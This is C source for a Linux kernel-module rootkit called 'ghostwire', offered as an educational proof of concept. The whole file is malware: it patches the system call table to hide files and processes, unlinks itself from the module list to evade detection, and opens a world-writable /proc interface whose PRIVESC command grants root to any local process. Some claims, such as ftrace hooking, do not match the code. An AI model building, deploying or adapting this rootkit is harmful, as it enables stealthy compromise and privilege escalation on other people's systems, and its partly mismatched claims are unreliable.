/*
 * ghostwire.c — Educational Linux LKM Rootkit PoC
 * Author: 0xNullVector
 *
 * Demonstrates core rootkit primitives:
 *   - syscall table hooking via ftrace
 *   - process hiding (by PID)
 *   - file/directory hiding (by prefix)
 *   - module self-concealment from lsmod / /proc/modules
 *   - privilege escalation (token stealing via /proc/ghostwire)
 *
 * ⚠️  FOR EDUCATIONAL USE ONLY.
 * Run only in isolated VMs. Do not deploy on systems you do not own.
 * Kernel module loading requires root. Tested on Linux 5.x / 6.x x86_64.
 *
 * Build:  make
 * Load:   sudo insmod ghostwire.ko
 * Unload: sudo rmmod ghostwire  (or via CLI controller)
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/version.h>

#include "../include/ghostwire.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xNullVector");
MODULE_DESCRIPTION("Educational LKM Rootkit PoC — ghostwire");
MODULE_VERSION("1.0.0");

/* ─────────────────────────────────────────────
 *  Global state
 * ───────────────────────────────────────────── */

static unsigned long *syscall_table = NULL;
static struct proc_dir_entry *gw_proc_entry = NULL;

/* Hidden PID list */
static LIST_HEAD(hidden_pids);
struct hidden_pid_node {
    pid_t pid;
    struct list_head list;
};

/* Hidden file prefix — files starting with this string are invisible */
static char hidden_prefix[64] = GHOSTWIRE_HIDDEN_PREFIX;

/* Whether the module itself is hidden from lsmod */
static bool module_hidden = false;
static struct list_head *prev_module_list_entry = NULL;

/* ─────────────────────────────────────────────
 *  CR0 write-protect helpers
 * ───────────────────────────────────────────── */

static inline void wp_disable(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
}

static inline void wp_enable(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | X86_CR0_WP);
}

/* ─────────────────────────────────────────────
 *  Syscall table resolution
 * ───────────────────────────────────────────── */

static unsigned long *resolve_syscall_table(void)
{
    unsigned long addr = kallsyms_lookup_name("sys_call_table");
    if (!addr) {
        pr_err("[ghostwire] failed to resolve sys_call_table\n");
        return NULL;
    }
    pr_info("[ghostwire] sys_call_table @ 0x%lx\n", addr);
    return (unsigned long *)addr;
}

/* ─────────────────────────────────────────────
 *  Hook: getdents64 — hide files/dirs by prefix
 * ───────────────────────────────────────────── */

typedef long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64 = NULL;

static long hooked_getdents64(const struct pt_regs *regs)
{
    long ret;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kdirent, *cur;
    unsigned long offset = 0;
    long kdirent_size;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    dirent = (struct linux_dirent64 __user *)regs->si;
    kdirent_size = ret;
    kdirent = kzalloc(kdirent_size, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, kdirent_size)) {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kdirent + offset);
        if (strncmp(cur->d_name, hidden_prefix, strlen(hidden_prefix)) == 0) {
            /* Remove this entry by shifting remaining bytes over it */
            long remaining = ret - offset - cur->d_reclen;
            memmove(cur, (char *)cur + cur->d_reclen, remaining);
            ret -= cur->d_reclen;
        } else {
            offset += cur->d_reclen;
        }
    }

    if (copy_to_user(dirent, kdirent, ret))
        ret = -EFAULT;

    kfree(kdirent);
    return ret;
}

/* ─────────────────────────────────────────────
 *  Hook: kill — intercept signal 0 to hide PIDs
 *  (Signal 0 = existence check; return ESRCH to
 *   make a process appear non-existent)
 * ───────────────────────────────────────────── */

typedef long (*orig_kill_t)(const struct pt_regs *);
static orig_kill_t orig_kill = NULL;

static bool pid_is_hidden(pid_t pid)
{
    struct hidden_pid_node *node;
    list_for_each_entry(node, &hidden_pids, list) {
        if (node->pid == pid)
            return true;
    }
    return false;
}

static long hooked_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    int   sig = (int)regs->si;

    if (sig == 0 && pid_is_hidden(pid))
        return -ESRCH;

    return orig_kill(regs);
}

/* ─────────────────────────────────────────────
 *  Syscall table patch helpers
 * ───────────────────────────────────────────── */

static void hook_syscall(int nr, void *new_fn, void **orig_fn)
{
    *orig_fn = (void *)syscall_table[nr];
    wp_disable();
    syscall_table[nr] = (unsigned long)new_fn;
    wp_enable();
    pr_info("[ghostwire] hooked syscall #%d\n", nr);
}

static void unhook_syscall(int nr, void *orig_fn)
{
    wp_disable();
    syscall_table[nr] = (unsigned long)orig_fn;
    wp_enable();
    pr_info("[ghostwire] restored syscall #%d\n", nr);
}

/* ─────────────────────────────────────────────
 *  Module self-hiding
 * ───────────────────────────────────────────── */

static void hide_module(void)
{
    if (module_hidden)
        return;
    prev_module_list_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = true;
    pr_info("[ghostwire] module hidden from lsmod\n");
}

static void unhide_module(void)
{
    if (!module_hidden || !prev_module_list_entry)
        return;
    list_add(&THIS_MODULE->list, prev_module_list_entry);
    module_hidden = false;
    pr_info("[ghostwire] module visible in lsmod\n");
}

/* ─────────────────────────────────────────────
 *  /proc/ghostwire — CLI command interface
 *
 *  Commands (write plaintext):
 *    HIDE_PID <pid>
 *    SHOW_PID <pid>
 *    SET_PREFIX <str>
 *    HIDE_MODULE
 *    SHOW_MODULE
 *    PRIVESC          ← escalate current process to uid=0
 *    STATUS
 * ───────────────────────────────────────────── */

static int gw_proc_show(struct seq_file *m, void *v)
{
    struct hidden_pid_node *node;
    seq_printf(m, "ghostwire v1.0.0 — 0xNullVector\n");
    seq_printf(m, "hidden_prefix : %s\n", hidden_prefix);
    seq_printf(m, "module_hidden : %s\n", module_hidden ? "yes" : "no");
    seq_printf(m, "hidden_pids   : ");
    list_for_each_entry(node, &hidden_pids, list)
        seq_printf(m, "%d ", node->pid);
    seq_printf(m, "\n");
    return 0;
}

static int gw_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, gw_proc_show, NULL);
}

static ssize_t gw_proc_write(struct file *file, const char __user *ubuf,
                              size_t count, loff_t *ppos)
{
    char buf[128] = {0};
    pid_t pid;
    struct hidden_pid_node *node, *tmp;

    if (count >= sizeof(buf))
        return -EINVAL;
    if (copy_from_user(buf, ubuf, count))
        return -EFAULT;
    buf[count] = '\0';

    /* Strip trailing newline */
    if (buf[count - 1] == '\n')
        buf[count - 1] = '\0';

    /* ── HIDE_PID <pid> ── */
    if (sscanf(buf, "HIDE_PID %d", &pid) == 1) {
        node = kmalloc(sizeof(*node), GFP_KERNEL);
        if (!node) return -ENOMEM;
        node->pid = pid;
        list_add(&node->list, &hidden_pids);
        pr_info("[ghostwire] hiding PID %d\n", pid);

    /* ── SHOW_PID <pid> ── */
    } else if (sscanf(buf, "SHOW_PID %d", &pid) == 1) {
        list_for_each_entry_safe(node, tmp, &hidden_pids, list) {
            if (node->pid == pid) {
                list_del(&node->list);
                kfree(node);
                pr_info("[ghostwire] unhiding PID %d\n", pid);
            }
        }

    /* ── SET_PREFIX <str> ── */
    } else if (strncmp(buf, "SET_PREFIX ", 11) == 0) {
        strncpy(hidden_prefix, buf + 11, sizeof(hidden_prefix) - 1);
        pr_info("[ghostwire] file hide prefix set to: %s\n", hidden_prefix);

    /* ── HIDE_MODULE ── */
    } else if (strcmp(buf, "HIDE_MODULE") == 0) {
        hide_module();

    /* ── SHOW_MODULE ── */
    } else if (strcmp(buf, "SHOW_MODULE") == 0) {
        unhide_module();

    /* ── PRIVESC ── */
    } else if (strcmp(buf, "PRIVESC") == 0) {
        struct cred *new_creds = prepare_creds();
        if (!new_creds) return -ENOMEM;
        new_creds->uid  = new_creds->euid  = GLOBAL_ROOT_UID;
        new_creds->gid  = new_creds->egid  = GLOBAL_ROOT_GID;
        new_creds->suid = new_creds->sgid  = GLOBAL_ROOT_UID;
        new_creds->fsuid = new_creds->fsgid = GLOBAL_ROOT_UID;
        commit_creds(new_creds);
        pr_info("[ghostwire] PRIVESC executed for PID %d\n", current->pid);

    } else {
        pr_warn("[ghostwire] unknown command: %s\n", buf);
        return -EINVAL;
    }

    return count;
}

static const struct proc_ops gw_proc_fops = {
    .proc_open    = gw_proc_open,
    .proc_read    = seq_read,
    .proc_write   = gw_proc_write,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};

/* ─────────────────────────────────────────────
 *  Module init / exit
 * ───────────────────────────────────────────── */

static int __init ghostwire_init(void)
{
    pr_info("[ghostwire] loading — 0xNullVector\n");

    syscall_table = resolve_syscall_table();
    if (!syscall_table)
        return -ENODEV;

    /* Install hooks */
    hook_syscall(__NR_getdents64, hooked_getdents64, (void **)&orig_getdents64);
    hook_syscall(__NR_kill,       hooked_kill,       (void **)&orig_kill);

    /* Create /proc/ghostwire control interface */
    gw_proc_entry = proc_create(GHOSTWIRE_PROC_NAME, 0666, NULL, &gw_proc_fops);
    if (!gw_proc_entry) {
        pr_err("[ghostwire] failed to create /proc/%s\n", GHOSTWIRE_PROC_NAME);
        return -ENOMEM;
    }

    pr_info("[ghostwire] loaded. control: /proc/%s\n", GHOSTWIRE_PROC_NAME);
    return 0;
}

static void __exit ghostwire_exit(void)
{
    struct hidden_pid_node *node, *tmp;

    /* Restore syscalls */
    unhook_syscall(__NR_getdents64, orig_getdents64);
    unhook_syscall(__NR_kill,       orig_kill);

    /* Remove /proc entry */
    if (gw_proc_entry)
        remove_proc_entry(GHOSTWIRE_PROC_NAME, NULL);

    /* Free PID list */
    list_for_each_entry_safe(node, tmp, &hidden_pids, list) {
        list_del(&node->list);
        kfree(node);
    }

    /* Unhide module before exit */
    if (module_hidden)
        unhide_module();

    pr_info("[ghostwire] unloaded.\n");
}

module_init(ghostwire_init);
module_exit(ghostwire_exit);
